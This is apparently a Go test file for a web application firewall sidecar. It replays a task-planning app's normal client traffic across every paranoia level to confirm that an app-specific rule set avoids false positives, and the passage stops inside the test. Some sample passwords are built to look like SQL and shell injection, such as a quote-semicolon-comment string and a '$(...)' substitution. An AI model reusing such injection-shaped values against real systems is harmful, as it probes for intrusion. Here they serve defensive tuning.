package services

import (
	"context"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/rand/v2"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"slices"
	"strings"
	"testing"
	"time"

	"ostiole/internal/model"
	"ostiole/internal/wafevent"
)

// td makes what Tendrils' web client sends, from a seed, with the shapes a
// server in use and the client's source showed. Names, text and ids are
// made up.
type td struct{ vw }

// id is a UUIDv7, as the server and the client write one.
func (g td) id() string {
	b := g.bytes(16)
	ms := uint64(1760000000000 + g.r.Int64N(1e10))
	for i := range 6 {
		b[i] = byte(ms >> (40 - 8*i))
	}
	b[6], b[8] = b[6]&0x0f|0x70, b[8]&0x3f|0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

// token is a session's, a share's or an invitation's: 32 random bytes in
// base64url.
func (g td) token() string { return base64.RawURLEncoding.EncodeToString(g.bytes(32)) }

func (g td) b64url(n int) string { return base64.RawURLEncoding.EncodeToString(g.bytes(n)) }

// day is a local date, and instant a time as JavaScript writes one.
func (g td) day() string {
	return time.Date(2026, time.Month(1+g.r.IntN(12)), 1+g.r.IntN(28), 0, 0, 0, 0, time.UTC).Format(time.DateOnly)
}

func (g td) instant() string {
	return time.Date(2026, time.Month(1+g.r.IntN(12)), 1+g.r.IntN(28), g.r.IntN(24), g.r.IntN(60), g.r.IntN(60), g.r.IntN(1000)*1e6,
		time.UTC).Format("2006-01-02T15:04:05.000Z")
}

func (g td) clock() string { return fmt.Sprintf("%02d:%02d", g.r.IntN(24), 15*g.r.IntN(4)) }

// tdZones are time zones a browser names, with every shape IANA has: two
// and three parts, dashes, underscores and a sign.
var tdZones = []string{"UTC", "Europe/Berlin", "Asia/Kolkata", "Pacific/Auckland", "America/Argentina/Buenos_Aires",
	"America/Port-au-Prince", "America/North_Dakota/New_Salem", "Etc/GMT+5", "Etc/GMT-14"}

// tdTitles are what people call a task, a list, a space or a label, in
// the shapes that trip the rules: quotes curly and straight, a dash, an
// ampersand, brackets, punctuation and words that are commands.
var tdTitles = []string{"Eat potato’s", "Call the plumber about the sink", "Renew passport — before May!", "Buy 2×4s & wood screws",
	"Read “The Lantern Keeper”", "Plan Sam's 40th (surprise!)", "Café run: oat milk, beans", "Garden & yard", "Work — Q4",
	"Who's bringing what?", "Sleep by 11", "Top 3 this week", "Watch the tide tables", "Kill the weeds (again)", "Echo Lake trip, day 2",
	"Pay rent / utilities", "50% off — ends Friday", "Ask: \"can we move it?\"", "Mi lista de la compra", "Büro aufräumen", "週末の買い物",
	"Set a time to find my keys", "Watch the retrieval logs", "Watch this, then nice work"}

// tdProse is what goes in notes, comments and the journal: Markdown with
// lists, links, emphasis and code, and plain sentences.
var tdProse = []string{
	"- \"Are you still watching\" prompt\n- \"Watch together\" feature\n- Metadata retrieval for music (lyrics too) and films",
	"It went swell",
	"I want to eat extra potato’s",
	"- [ ] milk\n- [x] eggs\n- [ ] bread (the seeded one)\n\nSee [the list](https://example.com/lists/groceries) for the rest.",
	"**Remember:** call before 5pm. It's the office on Maple St, not the depot.",
	"Walked the dog, then wrote for an hour. Felt good; tired by 9 though.",
	"Ideas:\n1. Ask Sam about the trip\n2. Look at flights, maybe Tuesday?\n3. Book the cabin -- if it's still free",
	"Use `git pull` before you start, then run the tests.",
	"> Done is better than perfect.\n\nStill, the shelf is crooked. Fix it this weekend & sand the edges.",
	"Notes from the call: budget's fine (≈ €1,200), deadline is the 14th, Jo will send the draft.",
	"Mañana: médico a las 10, después la farmacia.",
}

// tdSearches are what people type into the search box.
var tdSearches = []string{"plumber", "Sam's", "café", "trip, day", "Q4 — work", "who"}

func (g td) title() string { return g.pick(tdTitles...) }
func (g td) prose() string { return g.pick(tdProse...) }

// tdEndpoints are push service addresses in the shapes browsers' services
// write them: a long base64url path, a colon in the path, a query with an
// encoded token.
func (g td) endpoint() string {
	switch g.r.IntN(4) {
	case 0:
		return "https://updates.push.example.org/wpush/v2/gAAAAAB" + g.b64url(120)
	case 1:
		return "https://fcm.example.net/fcm/send/" + g.b64url(16) + ":APA91b" + g.b64url(100)
	case 2:
		return "https://web.push.example.com/" + g.b64url(90)
	default:
		return "https://wns2-par02p.notify.example.net/w/?token=" + url.QueryEscape(base64.StdEncoding.EncodeToString(g.bytes(150)))
	}
}

// credential is a passkey's answer as the browser's toJSON writes it, for
// signing in or, with an attestation, for registering.
func (g td) credential(register bool) map[string]any {
	id := g.b64url(16 + g.r.IntN(48))
	response := map[string]any{"clientDataJSON": g.b64url(120 + g.r.IntN(100)), "authenticatorData": g.b64url(37)}
	if register {
		response["attestationObject"] = g.b64url(200 + g.r.IntN(400))
		response["transports"] = []string{g.pick("internal", "hybrid", "usb"), "hybrid"}
		response["publicKeyAlgorithm"] = -7
		response["publicKey"] = g.b64url(91)
	} else {
		response["signature"] = g.b64url(70 + g.r.IntN(3))
		response["userHandle"] = g.b64url(32)
	}
	return map[string]any{"id": id, "rawId": id, "type": "public-key", "authenticatorAttachment": g.pick("platform", "cross-platform"),
		"clientExtensionResults": map[string]any{"credProps": map[string]any{"rk": true}}, "response": response}
}

func (g td) rule() string {
	return g.pick("FREQ=DAILY", "FREQ=DAILY;INTERVAL=3", "FREQ=WEEKLY;BYDAY=MO", "FREQ=WEEKLY;INTERVAL=2;BYDAY=MO,WE,FR;COUNT=5",
		"FREQ=MONTHLY;BYMONTHDAY=-1", "FREQ=MONTHLY;INTERVAL=3;BYDAY=2TU;UNTIL=20271231", "FREQ=MONTHLY;BYDAY=-1FR", "FREQ=YEARLY;BYMONTH=2;BYMONTHDAY=29",
		"FREQ=WEEKLY;BYDAY=SU", "FREQ=MONTHLY;BYDAY=MO,TU,WE,TH,FR;BYSETPOS=-1")
}

func (g td) when() map[string]any {
	if g.r.IntN(2) == 0 {
		return map[string]any{"date": g.day(), "time": nil}
	}
	return map[string]any{"date": g.day(), "time": g.clock()}
}

func (g td) goal() map[string]any {
	switch g.r.IntN(3) {
	case 0:
		return map[string]any{"mode": "metric", "metric": map[string]any{"start": 0, "target": 12.5, "unit": g.pick("km", "books", "pages read", "€")}}
	case 1:
		return map[string]any{"mode": "habit", "habit": map[string]any{"period": g.pick("day", "week", "month"), "target": 1 + g.r.IntN(5),
			"days": []string{"MO", "WE", "FR"}, "week_start": 1, "direction": g.pick("build", "break"), "limit": nil}}
	default:
		return map[string]any{"mode": g.pick("tasks", "manual"), "manual": nil}
	}
}

// tdRequest is one request of the client's. upload names a file sent as
// a form's part, and access is a share's access token. header holds an
// agent's headers, which sends it with its token in place of the
// session.
type tdRequest struct {
	method, path, body, upload, access string
	header                             map[string]string
}

func tdGet(path string) tdRequest         { return tdRequest{method: "GET", path: path} }
func tdBody(m, p string, b any) tdRequest { return tdRequest{method: m, path: p, body: vwJSON(b)} }
func tdQuery(pairs ...string) string      { return "?" + tdValues(pairs...).Encode() }
func tdValues(pairs ...string) url.Values {
	v := url.Values{}
	for i := 0; i+1 < len(pairs); i += 2 {
		v.Set(pairs[i], pairs[i+1])
	}
	return v
}

// requests is one session's worth: the views a day starts with, a task
// made, moved, edited and finished, the journal, comments, sharing,
// notifications and the account's settings.
func (g td) requests() []tdRequest {
	const api = "/api/v1"
	space, task, other, user, tz := g.id(), g.id(), g.id(), g.id(), g.pick(tdZones...)
	day := g.day()
	rs := []tdRequest{
		tdGet("/signin?next=" + url.QueryEscape(g.pick("/today", "/horizon", "/spaces/"+space, "/tasks/"+task))),
		tdGet(api + "/config"),
		tdGet(api + "/auth/me"),
		tdGet(api + "/views/counts" + tdQuery("tz", tz)),
		tdGet(api + "/views/today" + tdQuery("space", space, "tz", tz, "assignee", user)),
		tdGet(api + "/views/horizon" + tdQuery("from", day, "days", "1", "space", space, "types", "due,start,goal,repeat", "tz", tz)),
		tdGet(api + "/views/done" + tdQuery("before", g.instant(), "limit", "50", "space", space, "tz", tz)),
		tdGet(api + "/views/goals" + tdQuery("space", space, "status", g.pick("open", "done", "all"), "tz", tz)),
		tdGet(api + "/focus" + tdQuery("tz", tz)),
		tdGet(api + "/tasks" + tdQuery("space", space, "parent", g.pick("root", task), "completed", "recent", "lists", g.pick("include", "exclude"))),
		tdGet(api + "/tasks/" + task),
		tdGet(api + "/tasks/" + task + "/checkins" + tdQuery("before", g.instant(), "limit", "20")),
		tdGet(api + "/tasks/" + task + "/comments" + tdQuery("before", g.id(), "limit", "30")),
		tdGet(api + "/tasks/" + task + "/habit-stats?days=365"),
		tdGet(api + "/journal/days" + tdQuery("from", g.day(), "to", g.day())),
		tdGet(api + "/journal/days/" + day),
		tdGet(api + "/day-plan/" + day),
		tdGet(api + "/search" + tdQuery("q", g.pick(tdSearches...), "limit", "8", "kinds", "task,goal")),
		tdGet(api + "/spaces?archived=true"),
		tdGet(api + "/spaces/" + space + "/labels"),
		tdGet(api + "/notifications" + tdQuery("unread", "true", "limit", "20")),
		tdGet(api + "/shares" + tdQuery("space", space, "target", task)),
		tdGet(api + "/admin/users" + tdQuery("q", g.pick("sam", "jo@example.com"), "cursor", g.b64url(24), "limit", "50")),
		tdGet(api + "/admin/audit" + tdQuery("event", "auth.login", "user", user, "since", g.instant(), "until", g.instant(), "limit", "100")),
		tdBody("POST", api+"/tasks", map[string]any{"id": task, "space_id": space, "parent_id": g.pick(other, ""), "kind": g.pick("task", "goal", "list"),
			"title": g.title(), "notes": g.prose(), "priority": g.r.IntN(4), "start": g.when(), "due": g.when(), "tz": tz,
			"recurrence": map[string]any{"rule": g.rule(), "mode": g.pick("schedule", "after_completion")}, "labels": []string{g.id(), g.id()},
			"goal": g.goal(), "position": map[string]any{"after_id": other}, "assignees": []string{user}}),
		tdBody("PATCH", api+"/tasks/"+task, map[string]any{"title": g.title(), "notes": g.prose(), "priority": 2, "due": g.when(),
			"recurrence": nil, "attention_days": 14, "version": 1 + g.r.IntN(40)}),
		tdBody("POST", api+"/tasks/"+task+"/move", map[string]any{"parent_id": other, "space_id": space, "position": map[string]any{"before_id": g.id()}}),
		tdBody("POST", api+"/tasks/"+task+"/complete", map[string]any{"at": g.instant(), "occurrence": g.day(), "completion_id": g.id()}),
		tdBody("POST", api+"/tasks/"+task+"/undo", map[string]any{"completion_id": g.id()}),
		{method: "POST", path: api + "/tasks/" + task + "/reopen"},
		{method: "DELETE", path: api + "/tasks/" + task},
		{method: "POST", path: api + "/tasks/" + task + "/restore"},
		tdBody("POST", api+"/tasks/"+task+"/checkins", map[string]any{"id": g.id(), "value": 3.5, "delta": -1, "note": g.prose(), "at": g.instant()}),
		{method: "DELETE", path: api + "/checkins/" + g.id()},
		tdBody("PUT", api+"/journal/days/"+day, map[string]any{"body": g.prose(), "checkin_note": g.prose(), "ideas": g.prose(),
			"checked_in": true, "if_updated_at": g.instant()}),
		tdBody("POST", api+"/journal/notes", map[string]any{"id": g.id(), "date": day, "task_id": task, "body": g.prose()}),
		tdBody("PATCH", api+"/journal/notes/"+g.id(), map[string]any{"body": g.prose(), "if_updated_at": g.instant()}),
		tdBody("PUT", api+"/focus"+tdQuery("tz", tz), map[string]any{"task_ids": []string{task, other, g.id()}}),
		{method: "POST", path: api + "/focus/dismiss" + tdQuery("tz", tz)},
		{method: "POST", path: api + "/attention/" + task + "/dismiss" + tdQuery("tz", tz)},
		tdBody("PUT", api+"/day-plan/"+day, map[string]any{"task_ids": []string{task, other}}),
		tdBody("POST", api+"/recurrence/preview", map[string]any{"rule": g.rule(), "mode": "schedule", "anchor": g.when(), "tz": tz, "count": 5}),
		tdBody("POST", api+"/tasks/"+task+"/comments", map[string]any{"body": g.prose()}),
		tdBody("PATCH", api+"/comments/"+g.id(), map[string]any{"body": g.prose()}),
		tdBody("PUT", api+"/tasks/"+task+"/assignees", map[string]any{"user_ids": []string{user, g.id()}}),
		tdBody("POST", api+"/tasks/"+task+"/reminders", map[string]any{"kind": "absolute", "at": g.instant()}),
		tdBody("POST", api+"/tasks/"+task+"/reminders", map[string]any{"kind": "relative", "offset_minutes": -30, "anchor": g.pick("due", "start"), "at_time": g.clock()}),
		tdBody("POST", api+"/tasks/"+task+"/snooze", map[string]any{"until": g.instant()}),
		{method: "DELETE", path: api + "/reminders/" + g.id()},
		tdBody("POST", api+"/spaces", map[string]any{"name": g.title(), "color": g.pick("moss", "ocean", "h212")}),
		tdBody("PATCH", api+"/spaces/"+space, map[string]any{"name": g.title(), "archived": false}),
		tdBody("DELETE", api+"/spaces/"+space, map[string]any{"confirm": g.title()}),
		tdBody("POST", api+"/spaces/"+space+"/labels", map[string]any{"name": g.title(), "color": "plum"}),
		tdBody("PATCH", api+"/spaces/"+space+"/members/"+user, map[string]any{"role": g.pick("member", "viewer")}),
		tdBody("POST", api+"/spaces/"+space+"/invitations", map[string]any{"email": g.email(), "role": "member"}),
		tdBody("POST", api+"/notifications/read", map[string]any{"ids": []string{g.id(), g.id()}}),
		tdBody("PATCH", api+"/notify/prefs", map[string]any{"push_reminders": true, "digest_time": g.clock(), "quiet_enabled": true,
			"quiet_start": "22:00", "quiet_end": "07:30", "default_reminder_time": g.clock(), "badge_source": "today", "checkin_time": g.clock()}),
		tdBody("POST", api+"/push/subscriptions", map[string]any{"endpoint": g.endpoint(), "keys": map[string]any{"p256dh": g.b64url(65), "auth": g.b64url(16)}}),
		tdBody("PATCH", api+"/auth/me", map[string]any{"display_name": g.pick("Sam O'Neill", "Jo-Anne", "Ana María"), "timezone": tz, "week_start": 1}),
		tdBody("POST", api+"/auth/passkey/login/finish", map[string]any{"credential": g.credential(false), "remember_device": true}),
		tdBody("POST", api+"/auth/passkeys/register/finish", map[string]any{"credential": g.credential(true), "nickname": g.pick("Sam's laptop", "Phone (work)")}),
		tdBody("POST", api+"/auth/stepup/verify", map[string]any{"method": "totp", "code": fmt.Sprintf("%06d", g.r.IntN(1e6))}),
		tdBody("POST", api+"/auth/stepup/verify", map[string]any{"method": "recovery", "code": "7k2mq-x9c4d"}),
		tdBody("POST", api+"/auth/mfa/verify", map[string]any{"method": "email", "code": fmt.Sprintf("%06d", g.r.IntN(1e6)), "remember_device": false}),
		tdBody("POST", api+"/shares", map[string]any{"space_id": space, "kind": "tree", "target_id": task, "expires_at": g.instant(), "max_uses": 10,
			"include_notes": true, "show_people": false, "note": g.prose()}),
		{method: "GET", path: api + "/public/shares/" + g.token() + "/tree", access: g.token()},
		tdGet(api + "/public/shares/" + g.token() + "/attachments/" + g.id() + "/thumb" + tdQuery("access", g.token())),
		tdBody("POST", api+"/import/tasks?dry_run=1", map[string]any{"space_id": space, "parent_id": nil, "source": "todoist", "items": []any{
			map[string]any{"kind": "list", "title": g.title(), "children": []any{
				map[string]any{"kind": "task", "title": g.title(), "notes": g.prose(), "priority": 1, "due": g.when(),
					"recurrence": map[string]any{"rule": g.rule(), "mode": "schedule"}, "comments": []string{g.prose(), g.prose()}}}},
			map[string]any{"kind": "task", "title": g.title()}}}),
		tdBody("PATCH", api+"/admin/settings", map[string]any{"instance_name": g.pick("Our Plans", "Sam & Jo's tasks"), "registration_open": false,
			"members_can_create_spaces": true, "require_mfa": true, "mfa_remember_days": 30, "attachment_max_mb": 25, "space_quota_mb": 500}),
		tdBody("POST", api+"/admin/invites", map[string]any{"email": g.email(), "expires_in_hours": 72, "max_uses": 1, "send_email": true}),
		tdBody("POST", api+"/admin/smtp/test", map[string]any{"to": g.email()}),
		tdBody("PATCH", api+"/admin/users/"+user, map[string]any{"is_admin": false, "disabled": true}),
		tdBody("DELETE", api+"/admin/users/"+user, map[string]any{"transfers": map[string]any{space: g.id()}, "delete_spaces": []string{g.id()},
			"confirm_email": g.email()}),
		tdBody("DELETE", api+"/auth/me", map[string]any{"delete_spaces": []string{space}, "confirm_email": g.email()}),
		{method: "POST", path: api + "/tasks/" + task + "/attachments", upload: g.pick("receipt.pdf", "IMG_2041.jpeg", "floor-plan_v2.png", "Quarterly plan (final).pdf", "Café menu – v2.jpg")},
	}
	return rs
}

// tdRoutes are the server's routes, every one, whose paths CRS reads for
// commands since 4.30.
const tdRoutes = `
DELETE /api/v1/admin/ai/providers/{id}
DELETE /api/v1/admin/invites/{id}
DELETE /api/v1/admin/users/{id}
DELETE /api/v1/ai/jobs/{id}
DELETE /api/v1/ai/keys/{kind}
DELETE /api/v1/attachments/{id}
DELETE /api/v1/auth/me
DELETE /api/v1/auth/passkeys/{id}
DELETE /api/v1/auth/password
DELETE /api/v1/auth/sessions/{id}
DELETE /api/v1/auth/totp
DELETE /api/v1/auth/trusted-devices/{id}
DELETE /api/v1/checkins/{id}
DELETE /api/v1/comments/{id}
DELETE /api/v1/journal/notes/{id}
DELETE /api/v1/labels/{id}
DELETE /api/v1/push/subscriptions/{id}
DELETE /api/v1/reminders/{id}
DELETE /api/v1/reviews
DELETE /api/v1/reviews/{id}
DELETE /api/v1/shares/{id}
DELETE /api/v1/spaces/{id}
DELETE /api/v1/spaces/{id}/invitations/{invId}
DELETE /api/v1/spaces/{id}/join-links/{linkId}
DELETE /api/v1/spaces/{id}/members/{userId}
DELETE /api/v1/tasks/{id}
DELETE /api/v1/tasks/{id}/nudge
DELETE /api/v1/tasks/{id}/reminders/mute
DELETE /api/v1/tokens/{id}
DELETE /api/v1/trash/{id}
GET /api/v1/admin/agent-access
GET /api/v1/admin/ai
GET /api/v1/admin/ai/users
GET /api/v1/admin/audit
GET /api/v1/admin/audit/events
GET /api/v1/admin/backups
GET /api/v1/admin/invites
GET /api/v1/admin/settings
GET /api/v1/admin/status
GET /api/v1/admin/storage
GET /api/v1/admin/users
GET /api/v1/admin/users/{id}/deletion
GET /api/v1/ai/jobs/{id}
GET /api/v1/ai/status
GET /api/v1/ai/usage
GET /api/v1/attachments/{id}
GET /api/v1/attachments/{id}/thumb
GET /api/v1/auth/me
GET /api/v1/auth/me/deletion
GET /api/v1/auth/me/export
GET /api/v1/auth/mfa
GET /api/v1/auth/sessions
GET /api/v1/config
GET /api/v1/day-plan/{date}
GET /api/v1/events
GET /api/v1/focus
GET /api/v1/health
GET /api/v1/invitations
GET /api/v1/invites/{token}
GET /api/v1/journal/days
GET /api/v1/journal/days/{date}
GET /api/v1/notifications
GET /api/v1/notifications/count
GET /api/v1/notify/prefs
GET /api/v1/nudges
GET /api/v1/public/join/{token}
GET /api/v1/public/shares/{token}/attachments/{id}
GET /api/v1/public/shares/{token}/attachments/{id}/thumb
GET /api/v1/public/shares/{token}/goal
GET /api/v1/public/shares/{token}/horizon
GET /api/v1/public/shares/{token}/tree
GET /api/v1/push/subscriptions
GET /api/v1/push/vapid
GET /api/v1/ready
GET /api/v1/reviews/current
GET /api/v1/search
GET /api/v1/shares
GET /api/v1/shares/{id}/access
GET /api/v1/spaces
GET /api/v1/spaces/{id}
GET /api/v1/spaces/{id}/activity
GET /api/v1/spaces/{id}/ai-policy
GET /api/v1/spaces/{id}/export.md
GET /api/v1/spaces/{id}/invitations
GET /api/v1/spaces/{id}/join-links
GET /api/v1/spaces/{id}/labels
GET /api/v1/spaces/{id}/lists
GET /api/v1/spaces/{id}/members
GET /api/v1/tasks
GET /api/v1/tasks/{id}
GET /api/v1/tasks/{id}/activity
GET /api/v1/tasks/{id}/attachments
GET /api/v1/tasks/{id}/checkins
GET /api/v1/tasks/{id}/comments
GET /api/v1/tasks/{id}/habit-stats
GET /api/v1/tasks/{id}/journal
GET /api/v1/tasks/{id}/reminders
GET /api/v1/tokens
GET /api/v1/trash
GET /api/v1/views/counts
GET /api/v1/views/done
GET /api/v1/views/goals
GET /api/v1/views/horizon
GET /api/v1/views/today
PATCH /api/v1/admin/agent-access
PATCH /api/v1/admin/ai
PATCH /api/v1/admin/ai/providers/{id}
PATCH /api/v1/admin/ai/users/{id}
PATCH /api/v1/admin/settings
PATCH /api/v1/admin/users/{id}
PATCH /api/v1/auth/me
PATCH /api/v1/auth/mfa
PATCH /api/v1/auth/passkeys/{id}
PATCH /api/v1/comments/{id}
PATCH /api/v1/journal/notes/{id}
PATCH /api/v1/labels/{id}
PATCH /api/v1/notify/prefs
PATCH /api/v1/shares/{id}
PATCH /api/v1/spaces/{id}
PATCH /api/v1/spaces/{id}/members/{userId}
PATCH /api/v1/tasks/{id}
POST /api/v1/admin/ai/providers
POST /api/v1/admin/ai/providers/{id}/test
POST /api/v1/admin/backups
POST /api/v1/admin/invites
POST /api/v1/admin/smtp/test
POST /api/v1/admin/users/{id}/mfa/reset
POST /api/v1/admin/users/{id}/password-reset
POST /api/v1/ai/capture/break-down
POST /api/v1/ai/capture/jabber
POST /api/v1/ai/review/briefing
POST /api/v1/ai/review/weekly
POST /api/v1/attention/{id}/dismiss
POST /api/v1/auth/email/resend
POST /api/v1/auth/email/verify
POST /api/v1/auth/login
POST /api/v1/auth/logout
POST /api/v1/auth/mfa/email/send
POST /api/v1/auth/mfa/passkey/begin
POST /api/v1/auth/mfa/passkey/finish
POST /api/v1/auth/mfa/verify
POST /api/v1/auth/passkey/login/begin
POST /api/v1/auth/passkey/login/finish
POST /api/v1/auth/passkeys/register/begin
POST /api/v1/auth/passkeys/register/finish
POST /api/v1/auth/password
POST /api/v1/auth/password/forgot
POST /api/v1/auth/password/reset
POST /api/v1/auth/password/set
POST /api/v1/auth/recovery-codes
POST /api/v1/auth/register
POST /api/v1/auth/sessions/revoke-others
POST /api/v1/auth/setup
POST /api/v1/auth/stepup/begin
POST /api/v1/auth/stepup/email/send
POST /api/v1/auth/stepup/passkey/begin
POST /api/v1/auth/stepup/passkey/finish
POST /api/v1/auth/stepup/verify
POST /api/v1/auth/totp/confirm
POST /api/v1/auth/totp/enroll
POST /api/v1/auth/trusted-devices/revoke-all
POST /api/v1/focus/dismiss
POST /api/v1/import/tasks
POST /api/v1/invitations/{id}/accept
POST /api/v1/invitations/{id}/decline
POST /api/v1/join/{token}
POST /api/v1/journal/notes
POST /api/v1/mcp
POST /api/v1/notifications/read
POST /api/v1/own/{id}
POST /api/v1/public/shares/{token}/open
POST /api/v1/push/subscriptions
POST /api/v1/push/test
POST /api/v1/recurrence/preview
POST /api/v1/shares
POST /api/v1/spaces
POST /api/v1/spaces/{id}/invitations
POST /api/v1/spaces/{id}/join-links
POST /api/v1/spaces/{id}/labels
POST /api/v1/spaces/{id}/restore
POST /api/v1/spaces/{id}/transfer
POST /api/v1/tasks
POST /api/v1/tasks/similar
POST /api/v1/tasks/{id}/attachments
POST /api/v1/tasks/{id}/cancel
POST /api/v1/tasks/{id}/checkins
POST /api/v1/tasks/{id}/comments
POST /api/v1/tasks/{id}/complete
POST /api/v1/tasks/{id}/move
POST /api/v1/tasks/{id}/nudge/pause
POST /api/v1/tasks/{id}/reminders
POST /api/v1/tasks/{id}/reminders/mute
POST /api/v1/tasks/{id}/reopen
POST /api/v1/tasks/{id}/restore
POST /api/v1/tasks/{id}/skip
POST /api/v1/tasks/{id}/snooze
POST /api/v1/tasks/{id}/undo
POST /api/v1/tokens
POST /api/v1/trash/empty
PUT /api/v1/ai/keys/{kind}
PUT /api/v1/ai/settings
PUT /api/v1/day-plan/{date}
PUT /api/v1/focus
PUT /api/v1/journal/days/{date}
PUT /api/v1/own/{id}
PUT /api/v1/reviews/{id}/feedback
PUT /api/v1/spaces/{id}/ai-policy
PUT /api/v1/tasks/{id}/assignees
PUT /api/v1/tasks/{id}/nudge
`

// routes is a request to each of the server's routes, with ids, dates and
// tokens filled in and no body.
func (g td) routes() []tdRequest {
	var rs []tdRequest
	for line := range strings.Lines(strings.TrimSpace(tdRoutes)) {
		method, path, _ := strings.Cut(strings.TrimSpace(line), " ")
		path = strings.NewReplacer("{date}", g.day(), "{token}", g.token()).Replace(path)
		for strings.Contains(path, "{") {
			i, j := strings.Index(path, "{"), strings.Index(path, "}")
			path = path[:i] + g.id() + path[j+1:]
		}
		rs = append(rs, tdRequest{method: method, path: path})
	}
	return rs
}

// The passwords people choose, and the sign-ins, registrations and share
// openings that send them.
func (g td) passwordRequests() []tdRequest {
	const api = "/api/v1"
	pw := g.pick("correct horse battery staple", `p@ss'w0rd"; --`, "<Tr0ub4dor&3>", "hunter2 (old one)", "ñandú-$(2026)")
	return []tdRequest{
		tdBody("POST", api+"/auth/login", map[string]any{"email": g.email(), "password": pw}),
		tdBody("POST", api+"/auth/setup", map[string]any{"email": g.email(), "display_name": "Sam O'Neill", "password": pw}),
		tdBody("POST", api+"/auth/register", map[string]any{"email": g.email(), "display_name": "Jo-Anne", "password": pw, "invite": g.token()}),
		tdBody("POST", api+"/auth/password", map[string]any{"current_password": pw, "new_password": pw + "!"}),
		tdBody("POST", api+"/auth/password/reset", map[string]any{"token": g.token(), "password": pw}),
		tdBody("POST", api+"/auth/password/set", map[string]any{"password": pw}),
		tdBody("POST", api+"/auth/stepup/verify", map[string]any{"method": "password", "code": pw}),
		tdBody("POST", api+"/shares", map[string]any{"space_id": g.id(), "kind": "goal", "target_id": g.id(), "password": pw}),
		tdBody("PATCH", api+"/shares/"+g.id(), map[string]any{"password": pw, "max_uses": nil}),
		tdBody("POST", api+"/public/shares/"+g.token()+"/open", map[string]any{"password": pw}),
	}
}

// tdSend sends r to the Tendrils site at addr as the web client does,
// signed in, and returns the status.
func tdSend(t *testing.T, addr string, r tdRequest, cookie string) int {
	t.Helper()
	body, contentType := r.body, ""
	if body != "" {
		contentType = "application/json"
	}
	if r.upload != "" {
		var b strings.Builder
		w := multipart.NewWriter(&b)
		part, err := w.CreateFormFile("file", r.upload)
		if err != nil {
			t.Fatal(err)
		}
		_, _ = part.Write([]byte("the file's bytes"))
		_ = w.Close()
		body, contentType = b.String(), w.FormDataContentType()
	}
	tr := &http.Transport{DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
		var d net.Dialer
		return d.DialContext(ctx, network, addr)
	}}
	defer tr.CloseIdleConnections()
	req, err := http.NewRequestWithContext(t.Context(), r.method, "http://plan.example.com"+r.path, strings.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0")
	if r.header == nil {
		req.Header.Set("X-Tendril-Client", hex.EncodeToString([]byte(cookie[:16])))
		req.Header.Set("Cookie", "__Host-tendril_session="+cookie)
	}
	for k, v := range r.header {
		req.Header.Set(k, v)
	}
	if r.access != "" {
		req.Header.Set("X-Share-Access", r.access)
	}
	resp, err := (&http.Client{Transport: tr, Timeout: time.Minute}).Do(req)
	if err != nil {
		t.Fatalf("%s %s: %v", r.method, r.path, err)
	}
	_ = resp.Body.Close()
	return resp.StatusCode
}

// planSite runs the sidecar with one Tendrils site at paranoia pl,
// blocking, with the set loaded or not.
func planSite(t *testing.T, pl int, set bool) (string, *lockedBuffer) {
	t.Helper()
	profile := model.WAFProfile{ID: "plan", Mode: "block", Paranoia: pl}
	if set {
		profile.Applications = []string{"tendrils"}
	}
	cfg := &model.Config{}
	cfg.Services.Proxy = model.Proxy{
		Enabled: true, HTTPPort: freePort(t), HTTPSPort: freePort(t),
		Pools:    []model.ProxyPool{{ID: "tendrils", Upstreams: []model.ProxyUpstream{{Address: answer(t, "{}")}}}},
		Profiles: []model.WAFProfile{profile},
		Sites: []model.ProxySite{{ID: "plan", Enabled: true, Hosts: []string{"plan.example.com"}, Pool: "tendrils",
			PlainHTTP: true, WAF: "plan"}},
	}
	plain, _, out := runSidecar(t, sidecar(t), cfg, "", map[string][]string{model.SelfCertificate: {"127.0.0.1"}})
	return plain, out
}

// What Tendrils' web client sends passes at every paranoia level with the
// set loaded, where at paranoia 4 without it most requests are refused.
func TestTheTendrilsSetLetsItsClientThrough(t *testing.T) {
	t.Parallel()
	for pl := 1; pl <= 4; pl++ {
		t.Run(fmt.Sprintf("paranoia %d", pl), func(t *testing.T) {
			t.Parallel()
			plain, out := planSite(t, pl, true)
			g := td{vw{rand.New(rand.NewPCG(uint64(pl), 22))}}
			send := func(r tdRequest, what string) {
				if status := tdSend(t, plain, r, g.token()); status != http.StatusOK {
					t.Errorf("%s %s %.100q%s: %d", r.method, r.path, r.body, what, status)
				}
			}
			// Every title as a task's, a space's and a search, every piece
			// of prose as notes, a comment and a journal day, every zone.
			for _, title := range tdTitles {
				send(tdBody("POST", "/api/v1/tasks", map[string]any{"id": g.id(), "space_id": g.id(), "kind": "task", "title": title}), "")
				send(tdBody("PATCH", "/api/v1/spaces/"+g.id(), map[string]any{"name": title}), "")
				send(tdGet("/api/v1/search"+tdQuery("q", title, "limit", "8")), "")
			}
			for _, text := range tdProse {
				send(tdBody("PATCH", "/api/v1/tasks/"+g.id(), map[string]any{"notes": text, "version": 3}), "")
				send(tdBody("POST", "/api/v1/tasks/"+g.id()+"/comments", map[string]any{"body": text}), "")
				send(tdBody("PUT", "/api/v1/journal/days/"+g.day(), map[string]any{"body": text, "ideas": text, "checkin_note": text}), "")
			}
			for _, name := range []string{"receipt.pdf", "Quarterly plan (final).pdf", "Café menu – v2.jpg", "週末.png"} {
				send(tdRequest{method: "POST", path: "/api/v1/tasks/" + g.id() + "/attachments", upload: name}, "")
			}
			for _, tz := range tdZones {
				send(tdGet("/api/v1/views/counts"+tdQuery("tz", tz)), "")
			}
			for _, rule := range []string{"FREQ=WEEKLY;BYDAY=SU", "FREQ=WEEKLY;INTERVAL=2;BYDAY=SA,SU", "FREQ=MONTHLY;BYSETPOS=1;BYDAY=SA,SU"} {
				send(tdBody("POST", "/api/v1/recurrence/preview", map[string]any{"rule": rule, "mode": "schedule", "anchor": g.when(), "tz": "UTC", "count": 3}), "")
				send(tdBody("PATCH", "/api/v1/tasks/"+g.id(), map[string]any{"recurrence": map[string]any{"rule": rule, "mode": "after_completion"}, "version": 3}), "")
			}
			for _, r := range g.routes() {
				send(r, "")
			}
